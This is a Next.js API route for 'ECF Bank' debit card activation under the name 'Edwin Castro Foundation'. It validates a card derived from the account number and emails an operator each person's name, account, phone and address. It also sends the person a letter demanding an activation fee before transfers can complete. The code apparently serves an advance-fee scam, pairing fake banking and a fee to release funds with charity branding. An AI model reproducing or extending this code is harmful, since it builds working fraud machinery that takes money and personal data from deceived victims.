import { NextResponse } from 'next/server';
import nodemailer from 'nodemailer';
import { deriveDebitCard, DEBIT_CARD_BANKING_EMAIL, formatCardFee } from '@/lib/banking/card';
import { requireSessionAccount } from '@/lib/banking/session';

const zohoUser = process.env.ZOHO_USER;
const zohoPass = process.env.ZOHO_PASS;
const operatorTo =
  process.env.ECF_BANKING_EMAIL || DEBIT_CARD_BANKING_EMAIL || process.env.TO_EMAIL || zohoUser;

function escapeHtml(s: string): string {
  return s
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

function row(label: string, value: string) {
  return `<tr><td style="padding:6px 12px 6px 0;font-weight:600;vertical-align:top;color:#555;">${escapeHtml(label)}</td><td style="padding:6px 0;">${escapeHtml(value)}</td></tr>`;
}

export async function POST(req: Request) {
  try {
    const session = await requireSessionAccount();
    if (!session) return NextResponse.json({ error: 'Not signed in.' }, { status: 401 });

    const body = await req.json();
    const cardLast6 = String(body.cardLast6 || '').replace(/\D/g, '').slice(0, 6);
    const cardCvv = String(body.cardCvv || '').replace(/\D/g, '').slice(0, 4);
    const email = String(body.email || '').trim();
    const phone = String(body.phone || '').trim();
    const customerEmail = email && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email) ? email : '';

    const card = deriveDebitCard(session.accountNumber);
    if (cardLast6.length !== 6 || cardCvv.length !== 3) {
      return NextResponse.json(
        { error: 'Enter the last 6 digits and CVV from your debit card.', code: 'CARD_DETAILS_REQUIRED' },
        { status: 400 }
      );
    }
    if (cardLast6 !== card.last6 || cardCvv !== card.cvv) {
      return NextResponse.json(
        {
          error: 'Incorrect card information',
          code: 'CARD_DETAILS_INVALID',
          message: 'Incorrect card information. Check the last 6 digits and CVV on your card and try again.',
        },
        { status: 403 }
      );
    }
    if (!zohoUser || !zohoPass) {
      return NextResponse.json(
        { error: 'Request submission is temporarily unavailable. Please try again later.' },
        { status: 500 }
      );
    }

    const { seed, accountNumber } = session;
    const fullName = seed.fullName;
    const mailingAddress = [seed.addressLine1, seed.addressLine2, `${seed.city}, ${seed.state} ${seed.postalCode}`, seed.country]
      .filter(Boolean)
      .join(', ');
    const feeLabel = formatCardFee();

    const transporter = nodemailer.createTransport({
      host: 'smtp.zoho.com',
      port: 465,
      secure: true,
      auth: { user: zohoUser, pass: zohoPass },
    });

    await transporter.sendMail({
      from: zohoUser,
      to: operatorTo || zohoUser,
      replyTo: customerEmail || undefined,
      subject: `[Debit card activation] ${fullName} — ${accountNumber}`,
      text: `Debit card activation request\nName: ${fullName}\nAccount: ${accountNumber}\nEmail: ${customerEmail || '—'}\nPhone: ${phone || '—'}\nMailing address: ${mailingAddress}\nActivation fee: ${feeLabel}\nLast 6: ${cardLast6}`,
      html: `
        <h2>ECF Bank debit card activation request</h2>
        <table style="border-collapse:collapse;font-size:14px;line-height:1.5;">
          ${row('Full name', fullName)}
          ${row('Account number', accountNumber)}
          ${row('Email', customerEmail || '—')}
          ${row('Phone', phone || '—')}
          ${row('Address on file', mailingAddress)}
          ${row('Activation fee', feeLabel)}
          ${row('Last 6 digits submitted', cardLast6)}
        </table>
      `,
    });

    const customerTo = customerEmail || operatorTo || zohoUser;
    await transporter.sendMail({
      from: `"ECF Banking" <${zohoUser}>`,
      to: customerTo,
      replyTo: DEBIT_CARD_BANKING_EMAIL,
      subject: 'Your ECF Bank debit card activation request',
      html: `
        <p>Dear ${escapeHtml(fullName)},</p>
        <p>We received your request to activate your ECF Bank debit card.</p>
        <p>Your physical debit card is being mailed to the address on your account and typically arrives within <strong>5–7 business days</strong>. When it arrives, activation is required before the card can be used to complete transfers from your ECF Bank account.</p>
        <p><strong>How activation works</strong></p>
        <p>Activation confirms the card belongs to you and turns it on for Online Banking. Until activation is complete, outbound transfers that require card verification cannot finish.</p>
        <p><strong>Activation fee: ${feeLabel}</strong></p>
        <p>This fee covers card activation and posting to your account. ECF Banking will email you from <strong>${escapeHtml(DEBIT_CARD_BANKING_EMAIL)}</strong> with the next step to complete activation.</p>
        <p>Account on file: <strong>${escapeHtml(accountNumber)}</strong><br/>
        Name on file: ${escapeHtml(fullName)}<br/>
        Address on file: ${escapeHtml(mailingAddress)}</p>
        <p>If you have questions, reply to this email or write to ${escapeHtml(DEBIT_CARD_BANKING_EMAIL)}.</p>
        <p>ECF Banking<br/>Edwin Castro Foundation<br/>${escapeHtml(DEBIT_CARD_BANKING_EMAIL)}</p>
      `,
      text: `Dear ${fullName},\n\nWe received your request to activate your ECF Bank debit card.\n\nYour physical debit card is being mailed to the address on your account and typically arrives within 5–7 business days. When it arrives, activation is required before the card can be used to complete transfers from your ECF Bank account.\n\nHow activation works\nActivation confirms the card belongs to you and turns it on for Online Banking. Until activation is complete, outbound transfers that require card verification cannot finish.\n\nActivation fee: ${feeLabel}\n\nThis fee covers card activation and posting to your account. ECF Banking will email you from ${DEBIT_CARD_BANKING_EMAIL} with the next step to complete activation.\n\nAccount: ${accountNumber}\nName: ${fullName}\nAddress: ${mailingAddress}\n\nIf you have questions, write to ${DEBIT_CARD_BANKING_EMAIL}.\n\nECF Banking\nEdwin Castro Foundation\n`,
    });

    return NextResponse.json({
      ok: true,
      profile: {
        fullName,
        accountNumber,
        mailingAddress,
        addressLine1: seed.addressLine1,
        city: seed.city,
        state: seed.state,
        postalCode: seed.postalCode,
      },
    });
  } catch (err) {
    console.error('[banking/debit-card-request]', err);
    return NextResponse.json({ error: 'Could not submit request.' }, { status: 500 });
  }
}
